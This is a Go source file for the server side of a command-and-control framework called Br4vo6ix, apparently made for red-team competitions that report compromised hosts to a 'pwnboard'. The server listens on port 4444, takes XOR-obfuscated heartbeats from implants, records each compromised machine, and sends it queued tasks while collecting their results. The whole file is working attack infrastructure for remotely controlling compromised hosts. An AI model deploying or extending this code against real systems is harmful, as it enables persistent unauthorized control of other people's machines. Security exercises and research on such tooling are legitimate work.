package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"sync"

	"github.com/BradHacker/Br4vo6ix/ent"
	"github.com/BradHacker/Br4vo6ix/server/pwnboard"
	"github.com/sirupsen/logrus"
)

var PWNBOARD_IDENTIFIER = "Br4vo6ix"

func RunC2(client *ent.Client, wg *sync.WaitGroup) {
	// Assumes key exists since we previously check
	key := os.Getenv("BR4VO_KEY")

	StartListening(client, 4444, []byte(key))
}

func StartListening(client *ent.Client, port int, XOR_KEY []byte) {
	listener, err := ListenOnPort(port)
	if err != nil {
		logrus.Errorf("couldn't listen on port: %v\n", err)
		return
	}

	for {
		con, err := listener.Accept()
		if err != nil {
			logrus.Errorf("error accepting connection: %v\n", err)
			return
		}

		go HandleConnection(client, con, XOR_KEY)
	}
}

func ListenOnPort(port int) (net.Listener, error) {
	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		return nil, fmt.Errorf("error while listening on 0.0.0.0:%d:%v", port, err)
	}
	return listener, nil
}

func HandleConnection(client *ent.Client, c net.Conn, XOR_KEY []byte) {
	defer c.Close()

	ctx := context.Background()
	defer ctx.Done()

	// Read the hearbeat protobuf
	hb, err := ReadHeartbeat(c, XOR_KEY)
	if err != nil {
		logrus.Errorf("failed to read heartbeat: %v", err)
		return
	}

	go pwnboard.SendUpdate(hb.Ip, PWNBOARD_IDENTIFIER)

	// Get or create the implant in the database
	entImplant, err := GetImplant(ctx, client, hb)
	if err != nil {
		logrus.Warnf("failed to get/create implant: %v", err)
		err = SendNoOp(c, XOR_KEY)
		if err != nil {
			logrus.Errorf("error sending NOOP: %v", err)
		}
		return
	}

	// Set the "last seen" time and log the heartbeat
	entHeartbeat, err := LogCallback(ctx, client, entImplant, hb)
	if err != nil {
		logrus.Errorf("failed to log callback: %v", err)
		return
	}

	// Get the next queued task for this agent (if any)
	nextTask, err := GetQueuedTask(ctx, entImplant)
	// Send NOOP if client errors or if there is no task
	if err != nil || nextTask == nil {
		// Log the error if there is one
		if err != nil {
			logrus.Errorf("failed to get queued task: %v", err)
		}
		err = SendNoOp(c, XOR_KEY)
		if err != nil {
			logrus.Errorf("error sending NOOP: %v", err)
		}
		return
	}

	// Send the task to the implant
	err = SendTask(c, entHeartbeat, nextTask, XOR_KEY)
	if err != nil {
		logrus.Errorf("failed to send task: %v", err)
		err = SendNoOp(c, XOR_KEY)
		if err != nil {
			logrus.Errorf("error sending NOOP: %v", err)
		}
		return
	}

	// Wait for the response from the implant
	err = ReadTaskResponse(ctx, c, client, XOR_KEY)
	if err != nil {
		logrus.Errorf("failed to read task response: %v", err)
		return
	}
}
